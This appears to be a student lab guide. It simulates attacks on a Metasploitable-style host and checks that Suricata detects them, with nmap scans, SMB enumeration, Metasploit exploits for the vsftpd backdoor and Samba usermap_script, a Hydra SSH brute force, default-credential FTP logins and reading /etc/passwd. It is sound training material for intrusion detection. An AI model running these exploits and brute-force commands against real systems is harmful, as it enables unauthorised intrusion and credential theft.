# 💥 Attack Simulation Guide - SecureNet Lab

## Pre-Attack Setup (5 minutes)

### Start Packet Capture on Ubuntu
```bash
# Option 1: Wireshark (if GUI available)
sudo wireshark -i enp0s3 -k &

# Option 2: tcpdump (command line)
sudo tcpdump -i enp0s3 -w /tmp/attack_capture.pcap

# Option 3: tshark
sudo tshark -i enp0s3 -w /tmp/attack_capture.pcap
```

### Monitor Suricata Alerts (New Terminal)
```bash
sudo tail -f /var/log/suricata/fast.log
```

---

## Attack Phase 1: Reconnaissance (15 minutes)

### 1.1 Network Discovery
```bash
# Ping sweep
nmap -sn 10.10.20.0/24

# Screenshot: Suricata alert for ICMP sweep (SID 1000006)
```

### 1.2 Port Scan
```bash
# SYN scan (stealthy)
nmap -sS 10.10.20.10

# Screenshot: Suricata alert for Nmap scan (SID 1000001)
```

### 1.3 Service Enumeration
```bash
# Aggressive scan with version detection
nmap -sV -sC -A 10.10.20.10

# Save output
nmap -sV -sC -A 10.10.20.10 -oN ~/nmap_results.txt
```

### 1.4 SMB Enumeration
```bash
# Using enum4linux
enum4linux -a 10.10.20.10

# Screenshot: Suricata alert for SMB (SID 1000005)
```

---

## Attack Phase 2: Exploitation (20 minutes)

### 2.1 vsftpd Backdoor Exploit (Famous Metasploitable vuln)
```bash
msfconsole

# Inside Metasploit:
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.10.20.10
exploit

# If successful, you get a root shell!
# Screenshot: Shell access
# Screenshot: Suricata alert (SID 1000004)
```

### 2.2 Samba Exploit (Alternative)
```bash
use exploit/multi/samba/usermap_script
set RHOSTS 10.10.20.10
set LHOST 10.10.30.10   # Your Kali IP
exploit
```

### 2.3 SSH Brute Force Demo
```bash
# Using Hydra (limit attempts for demo)
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt \
  ssh://10.10.20.10 -t 4 -V -f

# Screenshot: Suricata alert (SID 1000003)
# Stop after a few attempts (Ctrl+C)
```

### 2.4 FTP Login Attempt
```bash
ftp 10.10.20.10
# Try: anonymous / anonymous
# Try: msfadmin / msfadmin

# Screenshot: Suricata alert (SID 1000002)
```

---

## Attack Phase 3: Post-Exploitation (10 minutes)

### If you have shell access:
```bash
# Gather system info
whoami
uname -a
cat /etc/passwd
ifconfig

# Screenshot: Proof of access
```

---

## Analysis Phase (30 minutes)

### Stop Captures
```bash
# On Ubuntu, stop tcpdump (Ctrl+C)
# Save the .pcap file
```

### Wireshark Analysis Filters
```bash
# Show all Kali traffic
ip.addr == 10.10.30.10

# Show SYN scans
tcp.flags.syn == 1 && tcp.flags.ack == 0

# Show FTP traffic
ftp

# Show SMB traffic  
smb || smb2

# Show vsftpd backdoor
tcp.port == 6200

# Show SSH attempts
tcp.port == 22
```

### Export Evidence
1. **Wireshark:** File → Export Specified Packets → Save filtered captures
2. **Copy pcap:** `cp /tmp/attack_capture.pcap ~/securenet-lab/captures/`

### Suricata Logs to Save
```bash
# Copy relevant alerts
sudo cat /var/log/suricata/fast.log > ~/suricata_alerts.txt

# Or get JSON logs
sudo cat /var/log/suricata/eve.json | jq . > ~/suricata_eve.json
```

---

## 📸 Screenshots Checklist

| # | Screenshot | For |
|---|-----------|-----|
| 1 | Nmap scan running | Recon evidence |
| 2 | Suricata SYN scan alert | IDS detection |
| 3 | Metasploit exploit success | Exploitation |
| 4 | Suricata vsftpd alert | IDS detection |
| 5 | Root shell access | Post-exploitation |
| 6 | Wireshark attack traffic | Network analysis |
| 7 | Filtered malicious packets | Forensics |
| 8 | Suricata alert summary | IDS effectiveness |

---

## Expected Suricata Alerts

| Attack | Expected Alert | SID |
|--------|---------------|-----|
| Ping sweep | ICMP Ping Sweep | 1000006 |
| Nmap scan | Nmap SYN Scan | 1000001 |
| FTP login | FTP Login Attempt | 1000002 |
| SSH brute force | SSH Brute Force | 1000003 |
| vsftpd exploit | vsftpd Backdoor | 1000004 |
| SMB enum | SMB Enumeration | 1000005 |

---

## Commands Summary Card

```bash
# === KALI COMMANDS ===
nmap -sn 10.10.20.0/24           # Discovery
nmap -sS -sV 10.10.20.10         # Port scan
msfconsole                        # Start Metasploit
enum4linux -a 10.10.20.10        # SMB enum

# === UBUNTU COMMANDS ===
sudo tail -f /var/log/suricata/fast.log   # Watch alerts
sudo tcpdump -i enp0s3 -w /tmp/capture.pcap  # Capture

# === METASPLOIT ===
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.10.20.10
exploit
```

---

**Good luck! Remember to take screenshots of everything!**
